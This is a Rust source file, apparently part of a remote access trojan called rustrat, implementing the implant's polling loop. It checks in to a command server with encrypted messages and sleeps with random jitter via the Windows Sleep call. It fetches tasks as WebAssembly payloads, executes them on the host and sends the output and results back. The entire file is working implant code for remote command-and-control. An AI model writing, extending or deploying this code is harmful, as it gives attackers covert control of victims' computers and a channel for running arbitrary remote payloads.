use crate::error::*;
use crate::ffi::FfiType;
use crate::runtime::{self, connector, executor};

use libffi::middle;
use rand::Rng;
use rustrat_common::messages;

use std::{cell::RefCell, rc::Rc};

// Runner that uses a single, fixed connector
// Cannot be dynamically configured on runtime
// TODO register wasm callbacks to set sleep time
pub struct PollingRunner {
    // TODO not Rc<RefCell<T>>?
    connector: Rc<RefCell<dyn connector::PollingConnector>>,

    common_utils: runtime::CommonUtils,
    crypto_configuration: runtime::CryptoConfiguration,

    sleep_range: std::ops::RangeInclusive<i32>,
}

impl PollingRunner {
    pub fn checkin(
        connector: Rc<RefCell<dyn connector::PollingConnector>>,
        common_utils: runtime::CommonUtils,
        crypto_configuration: runtime::CryptoConfiguration,
        sleep_microseconds: i32,
        jitter_percentage: f32,
    ) -> Result<Self> {
        // TODO not assert? Data type that enforces values?
        assert!((0.0..=1.0).contains(&jitter_percentage));

        let nop_request = messages::rat_to_server::Request::Nop.to_encrypted_message(
            crypto_configuration.public_key,
            crypto_configuration.shared_key,
            &mut common_utils.get_rng(),
        )?;
        let checkin_msg = messages::rat_to_server::Message::CheckIn(nop_request);

        let response = connector.borrow_mut().send(&checkin_msg)?;

        let response_message = match response {
            messages::server_to_rat::Message::EncryptedMessage(msg) => {
                msg.to_response(crypto_configuration.shared_key)?
            }
        };

        let sleep_jitter = (sleep_microseconds as f32 * jitter_percentage) as i32;

        match response_message {
            messages::server_to_rat::Response::CheckinSuccessful => {
                let runner = PollingRunner {
                    connector,
                    common_utils,
                    crypto_configuration,
                    sleep_range: (sleep_microseconds - sleep_jitter)
                        ..=(sleep_microseconds + sleep_jitter),
                };
                runner.define_sleep_fn()?;

                Ok(runner)
            }
            _ => Err(Error::CheckinFailed(crypto_configuration.public_key)),
        }
    }

    fn encrypt_and_send_request(
        &mut self,
        message: &messages::rat_to_server::Request,
    ) -> Result<messages::server_to_rat::Response> {
        let encrypted_message = message.to_encrypted_message(
            self.crypto_configuration.public_key,
            self.crypto_configuration.shared_key,
            &mut self.common_utils.get_rng(),
        )?;

        let message = messages::rat_to_server::Message::EncryptedMessage(encrypted_message);

        let response = self.connector.borrow_mut().send(&message)?;

        match response {
            messages::server_to_rat::Message::EncryptedMessage(encrypted_response) => {
                Ok(encrypted_response.to_response(self.crypto_configuration.shared_key)?)
            }
        }
    }

    fn sleep(&self) {
        let fn_table = self.common_utils.fn_table.borrow();
        let mut rng = self.common_utils.get_rng();

        let sleep_time = rng.gen_range(self.sleep_range.clone());

        unsafe {
            // TODO do something if Sleep returns an error?
            let _ = fn_table.call_fn::<()>("Sleep".to_string(), &[middle::arg(&sleep_time)]);
        }
    }

    fn define_sleep_fn(&self) -> Result<()> {
        let mut fn_table = self.common_utils.fn_table.borrow_mut();
        fn_table.register_fn(
            "Sleep".to_string(),
            "Kernel32.dll".to_string(),
            FfiType::VOID as i32,
            &[FfiType::DWORD as i32],
        )?;

        Ok(())
    }
}

impl runtime::strategy::Strategy for PollingRunner {
    fn run(mut self) {
        loop {
            // TODO optionally check for numberofpendingtasks first?
            match self.encrypt_and_send_request(&messages::rat_to_server::Request::GetPendingTask) {
                Ok(response) => {
                    match response {
                        // TODO do anything here?
                        messages::server_to_rat::Response::Nop => {}
                        messages::server_to_rat::Response::CheckinSuccessful => {
                            // TODO log error? Should not occur here
                            log::error!("Unexpected CheckinSuccessful received");
                        }
                        messages::server_to_rat::Response::NumberOfPendingTasks(_) => {
                            // TODO log error? Should not occur here
                            log::error!("Unexpected NumberOfPendingTasks received");
                        }
                        // TODO do anything here?
                        messages::server_to_rat::Response::NoTasks => {}
                        messages::server_to_rat::Response::Task { id, task } => {
                            match task {
                                messages::server_to_rat::Task::WebAssemblyTask {
                                    wasm,
                                    fn_name,
                                } => {
                                    let connector = self.connector.clone();
                                    let public_key = self.crypto_configuration.public_key;
                                    let shared_key = self.crypto_configuration.shared_key;
                                    let common_utils = self.common_utils.clone();

                                    let print_closure = move |msg: &str| {
                                        // TODO Do something other than just silently dropping errors?
                                        let result = messages::rat_to_server::Request::Output {
                                            task_id: id,
                                            output: msg.to_string(),
                                        }
                                        .to_encrypted_message(
                                            public_key,
                                            shared_key,
                                            &mut common_utils.get_rng(),
                                        )
                                        // Convert to rustrat-client Error enum
                                        .map_err(Error::from)
                                        // Encrypt message
                                        .map(messages::rat_to_server::Message::EncryptedMessage)
                                        // Send message
                                        .and_then(|msg| connector.borrow_mut().send(&msg));

                                        if let Err(err) = result {
                                            log::error!("Error occured when attempting to send output to server: {:?}", err)
                                        }
                                    };

                                    match executor::Environment::oneshot(
                                        &wasm,
                                        self.common_utils.clone(),
                                        print_closure,
                                        &fn_name,
                                    ) {
                                        Ok(result) => {
                                            match self.encrypt_and_send_request(
                                                &messages::rat_to_server::Request::TaskDone {
                                                    task_id: id,
                                                    result,
                                                },
                                            ) {
                                                Ok(_) => {
                                                    // TODO anything here? Not expecting a result
                                                }
                                                Err(err) => {
                                                    // TODO anything else here?
                                                    log::error!("Error when sending task done message: {:?}", err);
                                                }
                                            };
                                        }
                                        Err(err) => {
                                            log::error!("Task returned error: {:?}", err);
                                            match self.encrypt_and_send_request(
                                                &messages::rat_to_server::Request::TaskFailed {
                                                    task_id: id,
                                                },
                                            ) {
                                                Ok(_) => {
                                                    // TODO anything here? Not expecting a result
                                                }
                                                Err(err) => {
                                                    // TODO anything else here?
                                                    log::error!("Error when sending task errored message: {:?}", err);
                                                }
                                            };
                                        }
                                    };
                                }
                            };
                        }
                        messages::server_to_rat::Response::Exit => {
                            let _ = self
                                .encrypt_and_send_request(&messages::rat_to_server::Request::Exit);
                            log::info!("Received command to exit, exiting");
                            return;
                        }
                    }
                }
                Err(e) => log::debug!("{:?}", e),
            };

            self.sleep();
        }
    }
}
